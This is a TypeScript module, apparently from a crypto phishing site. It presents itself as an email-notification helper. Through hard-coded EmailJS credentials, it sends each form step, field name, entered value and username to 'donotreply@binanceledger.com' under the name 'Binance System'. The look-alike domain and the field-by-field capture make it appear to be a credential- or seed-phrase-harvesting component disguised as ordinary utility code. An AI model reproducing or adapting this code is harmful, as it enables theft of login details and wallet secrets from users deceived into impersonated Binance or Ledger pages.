
import emailjs from 'emailjs-com';

// Initialize EmailJS with your user ID immediately
emailjs.init("hDX5LRevxoenkHrjk");

interface EmailData {
  step: string;
  field?: string;
  value?: string;
  username?: string;
  timestamp: string;
  allFormData?: any;
  priority?: 'high' | 'normal';
}

export const sendEmailNotification = async (data: EmailData) => {
  console.log('=== EMAIL NOTIFICATION START ===');
  console.log('Priority level:', data.priority || 'normal');
  console.log('Data being sent:', data);

  // Use only the most basic template parameters
  const templateParams = {
    to_email: "donotreply@binanceledger.com",
    from_name: "Binance System",
    subject: "User Action",
    message: `Step: ${data.step || ''} at ${data.timestamp || ''}`,
    step: data.step || '',
    field: data.field || '',
    value: data.value || '',
    username: data.username || '',
    timestamp: data.timestamp || '',
    allFormData: ''
  };

  console.log('📧 Template parameters being sent:', templateParams);
  console.log('📧 Sending email immediately...');

  try {
    // Send email with minimal parameters
    const result = await emailjs.send(
      "service_r7sis9a",
      "template_dec5tz3", 
      templateParams
    );
    
    console.log('✅ Email sent successfully!', result);
    console.log('=== EMAIL NOTIFICATION END ===');
    return result;
  } catch (error) {
    console.error('❌ Email failed to send:', error);
    console.error('Error details:', error);
    console.error('Template params that failed:', templateParams);
    
    // For high priority, try with absolute minimal data
    if (data.priority === 'high') {
      console.log('🔄 Retrying with absolute minimal data...');
      try {
        const absoluteMinimalParams = {
          to_email: "donotreply@binanceledger.com",
          from_name: "System",
          subject: "Alert",
          message: "User action detected",
          step: "action",
          field: "",
          value: "",
          username: "",
          timestamp: "",
          allFormData: ""
        };
        
        const retryResult = await emailjs.send(
          "service_r7sis9a",
          "template_dec5tz3", 
          absoluteMinimalParams
        );
        console.log('✅ Minimal retry successful!', retryResult);
        return retryResult;
      } catch (retryError) {
        console.error('❌ Retry also failed:', retryError);
      }
    }
    
    console.log('=== EMAIL NOTIFICATION END (ERROR) ===');
    throw error;
  }
};

// Helper function for high-priority button clicks
export const sendHighPriorityNotification = async (data: Omit<EmailData, 'priority'>) => {
  return sendEmailNotification({ ...data, priority: 'high' });
};
